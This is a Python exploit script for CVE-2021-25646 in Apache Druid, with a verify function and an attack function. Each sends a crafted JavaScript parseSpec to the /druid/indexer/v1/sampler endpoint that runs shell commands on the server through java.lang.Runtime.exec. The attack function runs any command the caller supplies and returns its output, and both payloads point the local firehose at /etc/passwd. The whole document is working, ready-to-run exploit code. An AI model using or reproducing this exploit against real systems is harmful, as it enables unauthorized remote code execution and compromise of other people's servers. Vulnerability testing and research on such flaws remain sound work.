#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2021/2/4
# refer:https://www.tenable.com/cve/CVE-2021-25646
# https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg
# https://www.studysec.com/#/papers/java/ApacheDruid?id=apache-druid%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2021-25646
import requests
import json
import random
import hashlib
#requests.packages.urllib3.disable_warnings()
res = {}


def verify(target_node):
    target = target_node['target']
    url = target + "/druid/indexer/v1/sampler"
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Content-Type': 'application/json'}
    _keyword = hashlib.new('md5', str(random.randint(0, 99)).encode("utf-8")).hexdigest()
    try :
        sess = requests.session()
        sess.headers = headers
        payload = {
            "type": "index",
            "spec": {
                "ioConfig": {
                    "type": "index",
                    "firehose": {
                        "type": "local",
                        "baseDir": "/etc",
                        "filter": "passwd"
                    }
                },
                "dataSchema": {
                    "dataSource": "%%DATASOURCE%%",
                    "parser": {
                        "parseSpec": {
                            "format": "javascript",
                            "timestampSpec": {},
                            "dimensionsSpec": {},
                            "function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"echo %s\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"2013-09-01T12:41:27Z\",test: s}}" %(_keyword),
                            "": {
                                "enabled": "true"
                            }
                        }
                    }
                }
            },
            "samplerConfig": {
                "numRows": 10
            }
        }
        _response= sess.post(url,data=json.dumps(payload),verify=False)
        res_code = _response.status_code
        res_text = _response.text
        if 200 == res_code and _keyword in res_text:
                res['Info'] = 'FOUNDED VULNERABILTY!!!'
                res['Success'] = True
    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res


def attack(target_node):
    target = target_node['target']
    param =  target_node['param']
    url = target + "/druid/indexer/v1/sampler"
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Content-Type': 'application/json'}
    try :
        sess = requests.session()
        sess.headers = headers
        payload = {
          "type": "index",
          "spec": {
              "ioConfig": {
                  "type": "index",
                  "firehose": {
                      "type": "local",
                      "baseDir": "/etc",
                      "filter": "passwd"
                  }
              },
              "dataSchema": {
                  "dataSource": "%%DATASOURCE%%",
                  "parser": {
                      "parseSpec": {
                          "format": "javascript",
                          "timestampSpec": {},
                          "dimensionsSpec": {},
                          "function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"%s\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"2013-09-01T12:41:27Z\",test: s}}"%(param),
                          "": {
                              "enabled": "true"
                          }
                      }
                  }
              }
          },
          "samplerConfig": {
              "numRows": 10
          }
      }
        _response= sess.post(url,data=json.dumps(payload),verify=False)
        res_code = _response.status_code
        if 200== res_code:
                result = json.loads(_response.text)
                res['Info'] = 'VULNERABILTY Success Exploit!!!|%s'% result["data"][0]["input"]["test"]
                res['Success'] = True
    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res

